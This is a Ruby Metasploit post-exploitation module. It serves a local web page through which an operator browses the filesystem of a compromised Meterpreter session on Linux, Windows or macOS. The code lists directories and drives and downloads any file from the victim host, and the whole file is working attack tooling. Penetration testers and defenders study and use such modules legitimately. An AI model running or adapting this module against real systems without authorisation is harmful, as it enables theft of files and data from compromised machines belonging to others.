##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'cgi'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Browse the session filesystem in a Web Browser',
        'Description' => %q{
          This module allows you to browse the session filesystem via a local
          browser window.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'timwr'],
        'Platform' => [ 'linux', 'win', 'osx' ],
        'SessionTypes' => [ 'meterpreter' ],
        'DefaultOptions' => { 'SRVHOST' => '127.0.0.1' },
        'Notes' =>
          {
            'Reliability' => [ ],
            'SideEffects' => [ ],
            'Stability' => [ CRASH_SAFE ]
          }
      )
    )
  end

  def run
    exploit
  end

  def primer
    uri = get_uri.chomp('/') + '/'
    current_dir = pwd
    if session.platform == 'windows'
      current_dir = current_dir.gsub('\\', '/')
    end
    print_status("Current directory: #{uri}#{current_dir}")
  end

  def list_path(file_path, uripath)
    contents = []
    if file_path == '/' && session.platform == 'windows'
      get_drives.each do |drive|
        fname = "#{drive}:/"
        furl = uripath + fname
        contents << [furl, fname]
      end
      return contents
    end

    base_url = uripath
    if file_path.starts_with?('/')
      base_url = base_url.chomp('/')
    end
    base_url += file_path.chomp('/') + '/'
    dir(file_path).each do |file|
      next if ['.', '..'].include?(file)

      furl = base_url + file
      contents << [furl, file]
    end
    contents
  end

  def on_request_uri(cli, request)
    uripath = get_resource.chomp('/')

    # Convert http://127.0.0.1/URIPATH/file/ -> /file
    if request.uri != uripath && request.uri.starts_with?(uripath)
      file_path = request.uri[uripath.length, request.uri.length].chomp('/')
    end
    if file_path.blank?
      file_path = '/'
    end

    uripath += '/'

    # Convert /C: -> C:/
    if session.platform == 'windows'
      if file_path.starts_with?('/')
        file_path = file_path[1, file_path.length]
      end
      if /([A-Z]):$/ =~ file_path
        file_path += '/'
      end
    end
    if file_path.blank?
      file_path = '/'
    end

    print_status("Request uri: #{request.uri} file_path: #{file_path} from #{cli.peerhost}")
    if file?(file_path)
      # Download the file
      data = read_file(file_path)
      send_response(cli, data, { 'Content-Type' => 'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })
      return
    end

    # List the directory
    body = "<h2>Directory listing for #{CGI.escapeHTML(file_path)}</h2><hr>"
    body << "<ul>\n"
    if file_path != '/'
      basedir = request.uri[0, request.uri.chomp('/').rindex('/')]
      if basedir.blank?
        basedir = '/'
      end
      body << "<li><a href=\"#{CGI.escapeHTML(basedir)}\">..</a>\n"
    end
    list_path(file_path, uripath).each do |furl, fname|
      body << "<li><a href=\"#{CGI.escapeHTML(furl)}\">#{CGI.escapeHTML(fname)}</a>\n"
    end
    body << "</ul>\n"
    html = %(<html>
<head>
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>Metasploit File Sharing</title>
</head>
<body>
#{body}
</body>
</style>
</html>
    )
    send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })
  end
end
